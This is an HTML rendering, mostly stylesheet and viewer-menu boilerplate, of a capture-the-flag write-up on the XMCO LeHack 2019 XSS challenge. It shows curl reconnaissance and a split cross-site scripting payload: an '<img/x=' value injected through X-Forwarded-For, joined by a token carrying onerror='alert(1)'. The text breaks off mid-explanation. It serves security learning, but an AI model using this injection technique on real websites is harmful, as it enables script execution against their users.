@@ -1,0 +1,523 @@
+<html><head><style>body {
+	color: #333;
+	font-family: 'Segoe UI', 'Lucida Grande', Helvetica, sans-serif;
+	line-height: 1.5;
+	margin: 2em;
+}
+
+h1, h2, h3, h4, h5, h6 {
+	font-weight: normal;
+	line-height: 1em;
+	margin: 20px 0;
+}
+h1 {
+	font-size: 2.25em;
+}
+h2 {
+	font-size: 1.75em;
+}
+h3 {
+	font-size: 1.5em;
+}
+h4, h5, h6 {
+	font-size: 1.25em;
+}
+
+a {
+	color: #08C;
+	text-decoration: none;
+}
+a:hover, a:focus {
+	text-decoration: underline;
+}
+a:visited {
+	color: #058;
+}
+
+img {
+	max-width: 100%;
+}
+
+li + li {
+	margin-top: 3px;
+}
+dt {
+	font-weight: bold;
+}
+
+code {
+	background: #EEE;
+	font-family: "Consolas", "Lucida Console", monospace;
+	padding: 1px 5px;
+}
+pre {
+	background: #EEE;
+	padding: 5px 10px;
+	white-space: pre-wrap;
+}
+pre code {
+	padding: 0;
+}
+
+blockquote {
+	border-left: 5px solid #EEE;
+	margin: 0;
+	padding: 0 10px;
+}
+
+table {
+	border-collapse: collapse;
+	width: 100%;
+}
+table + table {
+	margin-top: 1em;
+}
+thead {
+	background: #EEE;
+	text-align: left;
+}
+th, td {
+	border: 1px solid #EEE;
+	padding: 5px 10px;
+}
+
+hr {
+	background: #EEE;
+	border: 0;
+	height: 1px;
+}
+</style><style media="print">body {
+    color: #000;
+    font: 12pt serif;
+    margin: 0;
+    max-width: 100%;
+}
+
+a {
+    color: #666;
+    text-decoration: underline;
+}
+a[href]:after {
+    content: ' (' attr(href) ')';
+}
+
+blockquote, ul, dl {
+    page-break-inside: avoid;
+}
+</style><style>/*
+
+Original highlight.js style (c) Ivan Sagalaev <maniac@softwaremaniacs.org>
+
+*/
+
+.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 0.5em;
+  background: #F0F0F0;
+}
+
+
+/* Base color: saturation 0; */
+
+.hljs,
+.hljs-subst {
+  color: #444;
+}
+
+.hljs-comment {
+  color: #888888;
+}
+
+.hljs-keyword,
+.hljs-attribute,
+.hljs-selector-tag,
+.hljs-meta-keyword,
+.hljs-doctag,
+.hljs-name {
+  font-weight: bold;
+}
+
+
+/* User color: hue: 0 */
+
+.hljs-type,
+.hljs-string,
+.hljs-number,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-quote,
+.hljs-template-tag,
+.hljs-deletion {
+  color: #880000;
+}
+
+.hljs-title,
+.hljs-section {
+  color: #880000;
+  font-weight: bold;
+}
+
+.hljs-regexp,
+.hljs-symbol,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-link,
+.hljs-selector-attr,
+.hljs-selector-pseudo {
+  color: #BC6060;
+}
+
+
+/* Language color: hue: 90; */
+
+.hljs-literal {
+  color: #78A960;
+}
+
+.hljs-built_in,
+.hljs-bullet,
+.hljs-code,
+.hljs-addition {
+  color: #397300;
+}
+
+
+/* Meta color: hue: 200 */
+
+.hljs-meta {
+  color: #1f7199;
+}
+
+.hljs-meta-string {
+  color: #4d99bf;
+}
+
+
+/* Misc effects */
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+</style><style>/* Style for the menu, possible positions/visibility */
+#__markdown-viewer__tools {
+  margin:0;
+  padding:0;
+  background:#555;
+  color:#eee;
+  box-shadow:0 -1px rgba(0,0,0,.5) inset;
+  border-radius: .5em;
+  max-width: 25%;
+  z-index: 2147483647;
+}
+
+#__markdown-viewer__tools.floating {
+  float:right;
+  margin: 0 0 .5em .5em;
+}
+
+#__markdown-viewer__tools.fixed {
+  position:fixed;
+  top:.5em;
+  right:1em;
+}
+
+#__markdown-viewer__tools.hidden {
+  display:none;
+}
+
+@media print {
+  #__markdown-viewer__tools {
+    display: none;
+  }
+}
+
+#__markdown-viewer__tools a[href]:after {
+  content: "";
+}
+
+/* Style for the menu top */
+label[for=__markdown-viewer__show-tools] {
+  display:block;
+  padding:0 18px 0 12px;
+  line-height:3em;
+  background:#333;
+  cursor:pointer;
+  border-radius: .5em;
+  min-height: 3em;
+  width: .9em;
+  float: right;
+}
+
+input#__markdown-viewer__show-tools:not(:checked) ~ label {
+  margin-left: -.9em;
+}
+
+input#__markdown-viewer__show-tools:checked ~ label {
+}
+
+label[for=__markdown-viewer__show-tools]:before{
+}
+
+label[for=__markdown-viewer__show-tools]:after {
+  content:"";
+  display:inline-block;
+  float:right;
+  margin-top:1.5em;
+  right:5px;
+  width:0;
+  height:0;
+  border-style: solid;
+  border-color: rgba(255,255,255,.5) transparent;
+  border-width: 4px 4px 0 4px;
+  transition:border-bottom .1s, border-top .1s .1s;
+}
+
+input#__markdown-viewer__show-tools:checked ~ label:after {
+  border-top-width:0;
+  border-bottom-width:4px;
+  transition:border-top .1s, border-bottom .1s .1s;
+}
+
+/* hide the input that tracks the menu's visibility */
+input#__markdown-viewer__show-tools {
+  display:none;
+}
+
+/* style, and hide/show menu items based on the input being checked */
+#__markdown-viewer__tools > .toggleable {
+  overflow:hidden;
+  transition-property:max-height, max-width, padding-top, padding-bottom, margin-top, margin-bottom;
+  transition-duration:0.5s;
+}
+
+input#__markdown-viewer__show-tools:checked ~ .toggleable {
+  max-width: 2000px;
+  max-height:300px;
+  transition-timing-function:ease-in;
+}
+
+input#__markdown-viewer__show-tools:not(:checked) ~ .toggleable {
+  max-height:0;
+  max-width:0;
+  transition-timing-function:ease-out;
+  padding-top:0;
+  padding-bottom:0;
+  margin-top:0;
+  margin-bottom:0;
+}
+
+/* style the table of contents and its items */
+#__markdown-viewer__toc {
+  display:block;
+  padding: .5em;
+  border:0;
+}
+
+#__markdown-viewer__toc::before {
+  content: "Table of Contents";
+  text-align: center;
+  display: block;
+  font-weight: bold;
+  text-decoration: underline;
+  margin: 1em auto;
+}
+
+#__markdown-viewer__tools select {
+  max-width: 40%;
+  margin: 0 .5em;
+}
+
+#__markdown-viewer__tools select,
+#__markdown-viewer__toc * {
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+#__markdown-viewer__toc a {
+  color: white;
+  text-decoration: none;
+}
+
+#__markdown-viewer__toc ul {
+  list-style: inside "• ";
+  padding: 0;
+  margin: 0;
+}
+
+#__markdown-viewer__toc ul ul {
+  padding-left: 1.5em;
+}
+
+
+/* Style the "Download Source" button at the end of the menu */
+#__markdown-viewer__tools > p {
+  text-align:center;
+  padding: 0 .5em;
+}
+
+#__markdown-viewer__download {
+  /* appearance: button; */
+  -moz-appearance: button !important;
+  display:inline-block;
+  text-align: center;
+  text-decoration:none;
+  color:#eee;
+  margin: .5em auto;
+}
+</style><meta name="viewport" content="width=device-width, initial-scale=1"><title>XMCO LeHack 2019 challenge</title></head><body><div id="__markdown-viewer__tools" class="fixed"><input type="checkbox" id="__markdown-viewer__show-tools"><label for="__markdown-viewer__show-tools"></label><div id="__markdown-viewer__toc" class="toggleable"><ul><li><a href="#xmco-lehack-2019-challenge">XMCO LeHack 2019 challenge</a><ul><li><a href="#introduction">Introduction</a></li><li><a href="#reconnaissance">Reconnaissance</a></li><li><a href="#vulnerability">Vulnerability</a></li><li><a href="#payload">Payload</a></li><li><a href="#attack-scenario">Attack scenario</a></li><li><a href="#remediation">Remediation</a></li></ul></li></ul></div><p class="toggleable">Pick a markdown and code style:<br><select id="__markdown-viewer__mdselect"><option value="sss">default</option><option value="github">github</option></select><select id="__markdown-viewer__hlselect"><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/agate.css">agate</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/androidstudio.css">androidstudio</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/arduino-light.css">arduino-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/arta.css">arta</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/ascetic.css">ascetic</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-cave.dark.css">atelier-cave.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-cave.light.css">atelier-cave.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-cave-dark.css">atelier-cave-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-cave-light.css">atelier-cave-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-dune.dark.css">atelier-dune.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-dune.light.css">atelier-dune.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-dune-dark.css">atelier-dune-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-dune-light.css">atelier-dune-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-estuary.dark.css">atelier-estuary.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-estuary.light.css">atelier-estuary.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-estuary-dark.css">atelier-estuary-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-estuary-light.css">atelier-estuary-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-forest.dark.css">atelier-forest.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-forest.light.css">atelier-forest.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-forest-dark.css">atelier-forest-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-forest-light.css">atelier-forest-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-heath.dark.css">atelier-heath.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-heath.light.css">atelier-heath.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-heath-dark.css">atelier-heath-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-heath-light.css">atelier-heath-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-lakeside.dark.css">atelier-lakeside.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-lakeside.light.css">atelier-lakeside.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-lakeside-dark.css">atelier-lakeside-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-lakeside-light.css">atelier-lakeside-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-plateau.dark.css">atelier-plateau.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-plateau.light.css">atelier-plateau.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-plateau-dark.css">atelier-plateau-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-plateau-light.css">atelier-plateau-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-savanna.dark.css">atelier-savanna.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-savanna.light.css">atelier-savanna.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-savanna-dark.css">atelier-savanna-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-savanna-light.css">atelier-savanna-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-seaside.dark.css">atelier-seaside.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-seaside.light.css">atelier-seaside.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-seaside-dark.css">atelier-seaside-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-seaside-light.css">atelier-seaside-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-sulphurpool.dark.css">atelier-sulphurpool.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-sulphurpool.light.css">atelier-sulphurpool.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-sulphurpool-dark.css">atelier-sulphurpool-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atelier-sulphurpool-light.css">atelier-sulphurpool-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atom-one-dark.css">atom-one-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/atom-one-light.css">atom-one-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/brown-paper.css">brown-paper</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/brown_paper.css">brown_paper</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/codepen-embed.css">codepen-embed</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/color-brewer.css">color-brewer</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/darcula.css">darcula</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/dark.css">dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/darkula.css">darkula</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/default.css">default</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/docco.css">docco</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/dracula.css">dracula</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/far.css">far</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/foundation.css">foundation</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/github.css">github</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/github-gist.css">github-gist</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/googlecode.css">googlecode</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/grayscale.css">grayscale</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/gruvbox-dark.css">gruvbox-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/gruvbox-light.css">gruvbox-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/hopscotch.css">hopscotch</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/hybrid.css">hybrid</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/idea.css">idea</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/ir-black.css">ir-black</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/ir_black.css">ir_black</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/kimbie.dark.css">kimbie.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/kimbie.light.css">kimbie.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/magula.css">magula</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/monokai.css">monokai</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/monokai-sublime.css">monokai-sublime</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/monokai_sublime.css">monokai_sublime</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/mono-blue.css">mono-blue</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/obsidian.css">obsidian</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/ocean.css">ocean</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/paraiso.dark.css">paraiso.dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/paraiso.light.css">paraiso.light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/paraiso-dark.css">paraiso-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/paraiso-light.css">paraiso-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/pojoaque.css">pojoaque</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/purebasic.css">purebasic</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/qtcreator_dark.css">qtcreator_dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/qtcreator_light.css">qtcreator_light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/railscasts.css">railscasts</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/rainbow.css">rainbow</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/routeros.css">routeros</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/school-book.css">school-book</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/school_book.css">school_book</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/solarized-dark.css">solarized-dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/solarized-light.css">solarized-light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/solarized_dark.css">solarized_dark</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/solarized_light.css">solarized_light</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/sunburst.css">sunburst</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/tomorrow.css">tomorrow</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/tomorrow-night.css">tomorrow-night</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/tomorrow-night-blue.css">tomorrow-night-blue</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/tomorrow-night-bright.css">tomorrow-night-bright</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/tomorrow-night-eighties.css">tomorrow-night-eighties</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/vs.css">vs</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/vs2015.css">vs2015</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/xcode.css">xcode</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/xt256.css">xt256</option><option value="moz-extension://2e2272ab-1ede-4ae7-9b22-d09997dff386/lib/highlightjs/styles/zenburn.css">zenburn</option></select></p><p class="toggleable"><a id="__markdown-viewer__download" download="markdown.html" style="display: none;">Download as HTML</a></p></div><div class="markdownRoot"><h1 id="xmco-lehack-2019-challenge">XMCO LeHack 2019 challenge</h1>
+<h2 id="introduction">Introduction</h2>
+<p>This challenge is a challenge presented by XMCO at the LeHack security
+conference on 2019-07-06.</p>
+<p>The challenge consists of a single web page. The web page contains a regular
+login form. The instruction gives a hint: the vulnerability to find is an XSS
+vulnerability.</p>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<p>The page is located at <a href="http://www.wannatry.fr/">http://www.wannatry.fr/</a> ; it contains a single login
+form.</p>
+<p>The index page redirects the user automatically to <code>/?token=[...]</code>
+The token is a base64 of 48 random-looking bytes:</p>
+<pre><code>$ base64 -d | xxd
+aLMkkv9GUVzFWVYPKPrEDZWRdJPc8AWFq5EXBpYJ9uXjiJ7ZDMFZh4uc3pZsAg1T
+00000000:<span class="hljs-number"> 68 </span>b3<span class="hljs-number"> 24 </span>92 ff<span class="hljs-number"> 46 </span>51 5c c5<span class="hljs-number"> 59 </span>56 0f<span class="hljs-number"> 28 </span>fa c4 0d  h.$..FQ\.YV.(...
+00000010:<span class="hljs-number"> 95 </span>91<span class="hljs-number"> 74 </span>93 dc f0<span class="hljs-number"> 05 </span>85 ab<span class="hljs-number"> 91 </span>17<span class="hljs-number"> 06 </span>96<span class="hljs-number"> 09 </span>f6 e5  ..t.............
+00000020: e3<span class="hljs-number"> 88 </span>9e d9 0c c1<span class="hljs-number"> 59 </span>87 8b 9c de<span class="hljs-number"> 96 </span>6c<span class="hljs-number"> 02 </span>0d<span class="hljs-number"> 53 </span> ......Y.....l..S
+</code></pre>
+<p>The token appears twice in the page:</p>
+<pre><code>$ curl -s <span class="hljs-string">'http://www.wannatry.fr/?token=SENTINEL'</span> | fgrep SENTINEL
+    &lt;link rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"/static/main.css?token=SENTINEL"</span> /&gt;
+    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/main.js?token=SENTINEL"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
+</code></pre>
+<p>Unfortunately, most "interesting characters" are filtered out. The single quote
+character is not filtered, but cannot be used for an injection in this context:</p>
+<pre><code><span class="xml">$ curl -s 'http://www.wannatry.fr/?token=SENTINEL"&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">'\'</span> | <span class="hljs-attr">fgrep</span> <span class="hljs-attr">SENTINEL</span> 
+    &lt;<span class="hljs-attr">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/static/main.css?token=SENTINEL&amp;quot;&amp;gt;&amp;lt;/'"</span> /&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/main.js?token=SENTINEL&amp;quot;&amp;gt;&amp;lt;/'"</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</span></code></pre>
+<p>The following mention appears on the page's footer: <code>Your IP Address (NULL) has been logged!</code>. This statements leads to believe that the IP address may be used
+as a vector for a reflective XSS.</p>
+<p>By using the <code>X-Forwarded-For</code> HTTP header, it is possible to make the web
+application store a different IP address. It is worth noting that the IP address
+displayed is always the <strong>previous</strong> one:</p>
+<pre><code><span class="hljs-meta">$</span><span class="bash"> curl -s <span class="hljs-string">'http://www.wannatry.fr/?token=foobar'</span> --header <span class="hljs-string">'X-Forwarded-For: SENTINEL'</span> | fgrep SENTINEL</span>
+(no reply)
+<span class="hljs-meta">
+$</span><span class="bash"> curl -s <span class="hljs-string">'http://www.wannatry.fr/?token=foobar'</span> --header <span class="hljs-string">'X-Forwarded-For: SENTINEL'</span> | fgrep SENTINEL</span>
+                        Your IP Address (SENTINEL) has been logged!
+</code></pre>
+<p>The IP address is reset when the token is changed.</p>
+<p>The value is truncated up to the first whitespace character. This value is
+limited to 9 characters which is just enough for <code>&lt;script&gt;/</code>.</p>
+<h2 id="vulnerability">Vulnerability</h2>
+<p>As mentioned earlier, the <code>token</code> variable is not vulnerable as it is properly
+filtered out. The IP address is unfiltered, but is limited in size.</p>
+<p>The token is written once after the IP address:</p>
+<pre><code>                        Your IP Address (<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="handlebars"><span class="xml">/) has been logged!
+                    <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"col l4 offset-l2 s12"</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">h5</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"black-text"</span>&gt;</span>Links<span class="hljs-tag">&lt;/<span class="hljs-name">h5</span>&gt;</span>
+                    <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span>
+                        <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"black-text text-lighten-3"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://www.xmco.fr/"</span>&gt;</span>XMCO<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
+                    <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>
+                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"footer-copyright"</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"black-text text-lighten-4 right"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#!"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">footer</span>&gt;</span>
+    <span class="hljs-comment">&lt;!--JavaScript at end of body for optimized loading--&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/main.js?token=foobar"</span>&gt;</span><span class="undefined"></span></span></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+</code></pre>
+<p>9 characters is small enough to put <code>&lt;img/x='</code> (8 characters).
+By using a single quote in the token field, this results in a single <code>img</code> tag
+"eating" the markup between the IP address and the token.</p>
+<p>Using the following values results in the following behaviour:
+<strong>X-Forwarded-For</strong>: <code>&lt;img/x='</code>
+<strong>Token</strong>: <code>' src='' onerror='alert(1)' /&gt;</code></p>
+<pre><code>                        Your IP Address (&lt;img/x=') has been logged!
+                    &lt;/p&gt;
+                &lt;/<span class="hljs-keyword">div</span>&gt;
+                &lt;<span class="hljs-keyword">div</span> <span class="hljs-built_in">class</span>=<span class="hljs-string">"col l4 offset-l2 s12"</span>&gt;
+                    &lt;h5 <span class="hljs-built_in">class</span>=<span class="hljs-string">"black-text"</span>&gt;Links&lt;/h5&gt;
+                    &lt;ul&gt;
